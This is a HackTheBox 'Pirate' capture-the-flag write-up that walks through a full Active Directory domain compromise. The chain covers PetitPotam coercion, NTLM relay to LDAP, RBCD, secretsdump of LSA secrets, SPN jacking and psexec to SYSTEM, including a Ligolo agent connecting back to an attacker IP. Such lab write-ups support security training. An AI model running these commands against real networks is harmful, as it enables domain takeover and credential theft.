# HackTheBox — Pirate (Hard)

![HTB](https://img.shields.io/badge/HackTheBox-Pirate-brightgreen?style=for-the-badge&logo=hackthebox)
![OS](https://img.shields.io/badge/OS-Windows%20Server%202019-blue?style=for-the-badge&logo=windows)
![Difficulty](https://img.shields.io/badge/Difficulty-Hard-red?style=for-the-badge)
![AD](https://img.shields.io/badge/Category-Active%20Directory-orange?style=for-the-badge)

> **Date:** March 4, 2026  
> **Author:** HTB  
> **OS:** Windows Server 2019 (Active Directory)

---

## Attack Chain Summary

```
Pre-Win2k Accounts → gMSA Password Read → Ligolo Pivot → PetitPotam Coercion
→ NTLM Relay to LDAP (--remove-mic) → RBCD → Secretsdump WEB01
→ cleartext password from LSA Secrets → ForceChangePassword
→ SPN Jacking → Constrained Delegation w/ Protocol Transition → Domain Admin
```

---

## Network Topology

```
KALI (<ATTACKER_IP>)
  │
  │ VPN
  │
DC01 (<TARGET_IP> / 192.168.100.1)  ◄────►  WEB01 (192.168.100.2)
  │  Dual-homed                               SMB Signing: OFF
  │
  └─ WEB01 can reach Kali directly ← critical for relay
```

---

## 1. Enumeration

### Port Scan

```bash
nmap -sC -sV -p- <TARGET_IP>
```

Key services on DC01:

| Port | Service | Note |
|------|---------|------|
| 53 | DNS | |
| 88 | Kerberos | |
| 389/636 | LDAP/LDAPS | Signing NOT enforced |
| 445 | SMB | Signing required on DC01, OFF on WEB01 |
| 5985 | WinRM | |

**Initial credentials provided:** `pentest:<REDACTED>`

---

## 2. Pre-Windows 2000 Machine Accounts

Using NetExec's `pre2k` module to discover computer accounts with default passwords:

```bash
nxc smb <TARGET_IP> -u pentest -p '<PASSWORD>' -M pre2k
```

> 💡 Pre-Windows 2000 compatible accounts are created with a predictable default password. Find them and try the obvious.

---

## 3. gMSA Password Retrieval

One of the discovered machine accounts has `msDS-AllowedToRetrieveManagedPassword` — it can read gMSA passwords.

```bash
# Get TGT for the machine account
getTGT.py 'pirate.htb/<MACHINE_ACCOUNT$>:<PASSWORD>' -dc-ip <TARGET_IP>
export KRB5CCNAME=<MACHINE_ACCOUNT>\$.ccache

# Read gMSA hashes
nxc ldap <TARGET_IP> -u '<MACHINE_ACCOUNT$>' -p '<PASSWORD>' --gmsa
```

> 💡 Log into DC01 with one of the gMSA hashes via evil-winrm and enumerate the network interfaces.

---

## 4. Pivoting with Ligolo-ng

DC01 is dual-homed. Set up a tunnel to reach the internal `192.168.100.0/24` network.

### Kali (proxy)

```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 192.168.100.0/24 dev ligolo
./proxy -selfcert -laddr 0.0.0.0:11601
```

### DC01 (agent, via evil-winrm)

```bash
evil-winrm -i <TARGET_IP> -u '<GMSA_ACCOUNT$>' -H '<GMSA_HASH>'
```

```powershell
.\agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert
```

### Ligolo console

```
session
start
listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445
```

### Internal Network Discovery

```bash
nmap -sV -p 445,80,5985 192.168.100.2
```

> 💡 Check whether WEB01 can reach your Kali IP directly — this is key for the next step.

---

## 5. NTLM Relay: PetitPotam → LDAP

### Why it works

- WEB01 has SMB signing disabled → can be coerced
- WEB01 can reach Kali directly → clean relay path
- LDAP signing not enforced on DC01 → relay accepted
- `--remove-mic` bypasses MIC check required for cross-protocol SMB→LDAP relay on Server 2019

> ⚠️ Use `ldap://` NOT `ldaps://` — LDAPS channel binding blocks relay on Server 2019

### Step 1 — Free port 445

```bash
sudo systemctl stop smbd nmbd
```

### Step 2 — Start ntlmrelayx with --delegate-access

```bash
sudo python3 ntlmrelayx.py \
  -t ldap://<TARGET_IP> \
  --remove-mic \
  --no-wcf-server \
  -smb2support \
  --delegate-access
```

> 💡 Using `--delegate-access` instead of `-i` (interactive shell) automatically configures RBCD — no timing race condition.

### Step 3 — Coerce WEB01

```bash
python3 PetitPotam.py \
  -u '<GMSA_ACCOUNT$>' \
  -hashes ':<GMSA_HASH>' \
  -d pirate.htb \
  <ATTACKER_IP> 192.168.100.2
```

### Result

```
[*] Authenticating connection from PIRATE/WEB01$ against ldap://<TARGET_IP> SUCCEED
[*] Adding new computer with username: <RANDOM>$ and password: <RANDOM>
[*] Delegation rights modified successfully!
[*] <RANDOM>$ can now impersonate users on WEB01$ via S4U2Proxy
```

> 💡 Note down the auto-created machine account username and password — you'll need them next.

---

## 6. S4U2Proxy → Administrator on WEB01

```bash
sudo ntpdate -u <TARGET_IP>

python3 getST.py \
  -spn cifs/WEB01.pirate.htb \
  -impersonate Administrator \
  -dc-ip <TARGET_IP> \
  'pirate.htb/<RELAY_MACHINE$>:<RELAY_PASSWORD>'

export KRB5CCNAME=Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache
```

---

## 7. Secretsdump WEB01

```bash
python3 secretsdump.py \
  -k -no-pass \
  -target-ip 192.168.100.2 \
  WEB01.pirate.htb
```

> 💡 Read LSA Secrets carefully — look for `DefaultPassword`. Systems configured for auto-logon store credentials in cleartext here.

---

## 8. ForceChangePassword

BloodHound reveals a privilege path from the user found in LSA Secrets to an admin account.

```bash
net rpc password '<TARGET_ACCOUNT>' '<NEW_PASSWORD>' \
  -U 'pirate.htb/<SOURCE_USER>%<SOURCE_PASSWORD>' \
  -S <TARGET_IP>
```

Verify:

```bash
nxc smb <TARGET_IP> -u '<TARGET_ACCOUNT>' -p '<NEW_PASSWORD>' -d pirate.htb
```

---

## 9. Constrained Delegation + SPN Jacking → Domain Admin

### Delegation Discovery

```bash
python3 findDelegation.py 'pirate.htb/<ACCOUNT>:<PASSWORD>' -dc-ip <TARGET_IP>
```

> 💡 Look for Constrained Delegation with Protocol Transition. Also check BloodHound for WriteSPN rights on DC01$.

### SPN Jacking

Move the delegated SPN from WEB01$ to DC01$ — the KDC will then think that SPN lives on DC01:

```python
import ldap3

server = ldap3.Server('<TARGET_IP>', get_info=ldap3.ALL)
conn = ldap3.Connection(server, user='pirate.htb\\<ACCOUNT>',
                        password='<PASSWORD>', authentication=ldap3.NTLM, auto_bind=True)

# Remove SPN from WEB01$
conn.modify('CN=WEB01,CN=Computers,DC=pirate,DC=htb',
    {'servicePrincipalName': [(ldap3.MODIFY_DELETE, ['<SPN>'])]})

# Add SPN to DC01$
conn.modify('CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb',
    {'servicePrincipalName': [(ldap3.MODIFY_ADD, ['<SPN>'])]})
```

### KCD with altservice

```bash
python3 getST.py \
  -spn <DELEGATED_SPN> \
  -impersonate Administrator \
  -altservice CIFS/DC01.pirate.htb \
  -dc-ip <TARGET_IP> \
  'pirate.htb/<ACCOUNT>:<PASSWORD>'
```

> 💡 `-altservice` rewrites the service in the ticket. The ticket is still encrypted with DC01's key — DC01 accepts it as valid.

---

## 10. SYSTEM Shell on DC01

```bash
export KRB5CCNAME=Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache

python3 psexec.py -k -no-pass \
  -dc-ip <TARGET_IP> \
  -target-ip <TARGET_IP> \
  pirate.htb/Administrator@DC01.pirate.htb
```

```
Microsoft Windows [Version 10.0.17763.8385]
C:\Windows\system32> whoami
nt authority\system
```

---

## Flags

| Flag | Location |
|------|----------|
| User | `\\192.168.100.2\c$\Users\<USER>\Desktop\user.txt` |
| Root | `C:\Users\Administrator\Desktop\root.txt` |

---

## Key Takeaways

1. **Network connectivity testing is crucial** — Always verify whether the coerced host can reach your machine directly. It changes the entire relay topology.

2. **`ldap://` not `ldaps://` for relay** — LDAPS channel binding blocks NTLM relay on Server 2019. Use plain LDAP with `--remove-mic` to bypass MIC verification.

3. **`--delegate-access` over interactive shell** — Avoids the timing race condition of connecting to an ephemeral LDAP shell. ntlmrelayx handles RBCD configuration automatically.

4. **DefaultPassword in LSA Secrets** — Auto-logon systems store credentials in cleartext. Always read LSA Secrets carefully in secretsdump output.

5. **SPN Jacking** — `WriteSPN` on a target lets you redirect any constrained delegation chain to that target by moving the SPN. Combined with `-altservice` in getST.py, this converts any service ticket type into CIFS access for psexec.

---

*Writeup by [Vin] | HackTheBox — Pirate (Hard)*
